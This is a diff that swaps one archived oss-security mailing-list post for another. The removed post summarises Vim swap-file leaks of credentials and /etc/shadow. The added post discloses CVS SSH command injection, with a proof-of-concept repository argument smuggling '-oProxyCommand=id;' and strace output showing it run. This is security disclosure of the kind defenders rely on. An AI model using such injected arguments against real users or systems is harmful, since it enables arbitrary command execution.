@@ -1,130 +1,50 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/11/27/2
-Message-ID: <540058ee-2c54-161a-1530-ff1b05673d25@Z5T1.com>
-Date: Mon, 27 Nov 2017 14:10:54 -0500
-From: Scott Court <z5t1@...1.com>
-To: Kurt Seifried <kseifrie@...hat.com>
-Cc: oss-security@...ts.openwall.com, Bram@...lenaar.net
-Subject: Re: Re: Security risk of server side text editing ...
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/08/11/1
+Message-ID: <20170810171047.5cdf7131-a82f-46f0-b4c4-3015acbc431b@korelogic.com>
+Date: Thu, 10 Aug 2017 17:32:24 -0600
+From: Hank Leininger <hlein@...elogic.com>
+To: oss-security@...ts.openwall.com
+Subject: CVS and ssh command injection (see CVE-2017-1000117, etc.)
 Content-Type: text/plain; charset=utf-8
 
-Hi Kurt,
+SSH command injection via -o... impacts CVS 1.12.x as well, if anybody
+still cares.
 
-Here's the summary you asked for. As far as I've been able to tell,
-there are three vulnerabilities being discussed here:
+The announcement for git mentions CVE-2017-1000117, CVE-2017-9800, and
+CVE-2017-1000116 for git, Subversion, Mercurial, but makes no mention
+of CVS.  None of those CVEs are currently viewable at
+https://cve.mitre.org/cgi-bin/cvename.cgi?name= , and I don't know if
+these were discussed on a private list prior to publication, and
+whether that discussion included CVS.
 
+CVS can be configured to use SSH for remote repos, such as with
+CVS_RSH=ssh.  In which case specifying a hostname of -o... triggers the
+same sort of thing:
 
-    1. CVE-2017-1000382
+  $ strace -f -e execve cvs -d '-oProxyCommand=id;localhost:/bar' co yada 2>&1 | egrep id
+  execve("/usr/bin/cvs", ["cvs", "-d", "-oProxyCommand=id;localhost:/bar", "co", "yada"], 0x7ffe69f75a68 /* 139 vars */) = 0
+  [snip]
+  [pid 20003] execve("/usr/local/bin/ssh", ["ssh", "-oProxyCommand=id;localhost", "cvs server"], 0x5fb1fc8420 /* 141 vars */) = -1 ENOENT (No such file or directory)
+  [pid 20003] execve("/usr/bin/ssh", ["ssh", "-oProxyCommand=id;localhost", "cvs server"], 0x5fb1fc8420 /* 141 vars */) = 0
+  [pid 20004] execve("/bin/bash", ["/bin/bash", "-c", "exec id;localhost"], 0x32af5f10d0 /* 141 vars */) = 0
+  [pid 20004] execve("/usr/bin/id", ["id"], 0xec92226ae0 /* 141 vars */) = 0
+  [pid 20004] +++ exited with 0 +++
+  [pid 20003] --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=20004, si_uid=3612, si_status=0, si_utime=0, si_stime=0} ---
+  ssh_exchange_identification: Connection closed by remote host
+  [pid 20003] +++ exited with 255 +++
+  --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=20003, si_uid=3612, si_status=255, si_utime=0, si_stime=0} ---
 
-This vulnerability was discovered by Hanno Böck. When editing a text
-file in Vim, a .swp file is created in the same directory (if you edit
-"foo", the swap file will be ".foo.swp"). Hanno pointed out that this
-could create a security vulnerability on PHP enabled webservers as follows:
+Tested vanilla 1.12.13, and Gentoo 1.12.12-r11.
 
-If a user goes to edit a .php file in the public_html directory (say
-"foo.php"), a swap file will be created in the public_html directory
-called ".foo.php.swp". This then exposes the contents of the PHP script
-foo.php to the world. All someone has to do is go to
-"http://example.com/.foo.php.swp" and he can view the .swp file which
-contains the contents of the original foo.php file.
+Of course, the repo specification looks very odd, so tricking a victim
+may be harder than for SCM tools where it's prefixed by an ssh:// or
+masked behind a redirect.  Plus, first you would have find a victim.
 
-Hanno pointed out that this causes a problem with Wordpress sites if the
-site administrator edits the wp-config.php file in Vim: he exposes all
-of the database credentials. This is made worse if Vim crashes while he
-is editing it as then the .wp-config.php.swp file sticks around. He
-claims he has found 750 websites that are vulnerable to this.
+Thanks,
 
+-- 
 
-    2. Vim .swp file group (Doesn't have a CVE ID)
+Hank Leininger <hlein@...elogic.com>
+5F6D DCC8 FF53 8093 EC39  127B 091E 7F7C E898 E86C
 
-This vulnerability was discovered by me. When Vim creates a .swp file,
-the .swp file is created with the owner and group set to the editor and
-editor's primary group respectively. The .swp file is the set to the
-same permissions as the original file (i.e. chmod 640). This creates a
-security vulnerability when the editor's primary group is not the same
-as the original file's group.
-
-For example, say the root user's primary group is "users", which every
-user is a member of. If root goes to edit /etc/shadow, the
-/etc/.shadow.swp file is created with permissions 640 and user:group set
-to root:users. The original /etc/shadow file had user:group set to
-root:shadow though; this now exposes the /etc/shadow file (which mind
-you contains hashes of every user's password) to every user on the system.
-
-Originally, I thought this was an extension of CVE-2017-1000382 so I
-didn't bother trying to get a CVE ID for it; however, upon looking at it
-for a second time, it seems that this is indeed a different
-vulnerability. It is possible to patch this vulnerability without
-patching CVE-2017-1000382.
-
-
-    3. Vim.tiny race condition (Doesn't have a CVE ID as far as I know)
-
-I'm not quite sure who discovered this vulnerability (I don't use or
-follow vim.tiny); however, it has been discussed on here so I will
-include my limited knowledge of it for completeness sake. This is a race
-condition in which a world writable SUID binary is temporarily created.
-This could (or course) theoretically allow an arbitrary user to write to
-that binary and execute arbitrary code as root; however, there is debate
-as to whether or not doing this is actually feasible.
-
----
-
-I believe these are the three big ones; however, I may have missed
-something. There has been a lot of discussion about this family of
-vulnerabilities lately. There are definitely at least these three
-though. I'm sure if I've missed anything everyone else on this mailing
-list will be more than happy to let me know.
-
-Sincerely,
-
-Scott Court
-
-
-On 11/22/2017 05:27 PM, Kurt Seifried wrote:
-> Can you post a summary of the issues, it sounds like more than one CVE will be needed, thanks.
->
->
-> -Kurt
->
->
->
->
->
->> On Nov 22, 2017, at 15:17, Solar Designer <solar@...nwall.com> wrote:
->>
->>> On Fri, Nov 17, 2017 at 11:35:15AM +0100, Bram Moolenaar wrote:
->>> Please check out patch 8.0.1300.
->> Thanks.  Personally, I don't have much to add.  This continues to do
->> what I find are weird and wrong things, so any implementation issues are
->> secondary to that.  I suppose you have some rationale for preserving the
->> old behavior of propagating the edited file's permissions onto related
->> temporary files, but I'm unaware of good reasons for that.
->>
->> If it's about users' collaboration, then I don't see a good reason for
->> other users in the group, even if they could access the original file
->> via group permissions, to also have access to recovery and backup files.
->>
->> As to the patch itself, aside from it propagating the possibly unsafe
->> permissions on purpose (I mean unsafe such as in Hanno's original
->> example, but also applying to backup files), it's also risky in
->> temporarily setting umask to 0.  On some systems, this could mean libc
->> or the kernel creating files with unsafe permissions if anything goes
->> very wrong during this time - e.g., a coredump.  Checking st_ino is OK
->> as a hardening measure, but might not always be sufficient: inode number
->> reuse is possible if the original file could have been deleted.
->> I suppose st_dev is not checked because of the use of O_NOFOLLOW, but I
->> guess Vim can be built on systems without working O_NOFOLLOW as well?
->>
->> In case anyone wants to review the patch for real, I've attached it to
->> this message, and here it is on GitHub (for expanding of the context):
->>
->> https://github.com/vim/vim/commit/cd142e3369db8888163a511dbe9907bcd138829c
->>
->> Alexander
->> <8.0.1300>
-
-
-Content of type "text/html" skipped
-
-Download attachment "signature.asc" of type "application/pgp-signature" (820 bytes)
+Download attachment "signature.asc" of type "application/pgp-signature" (489 bytes)
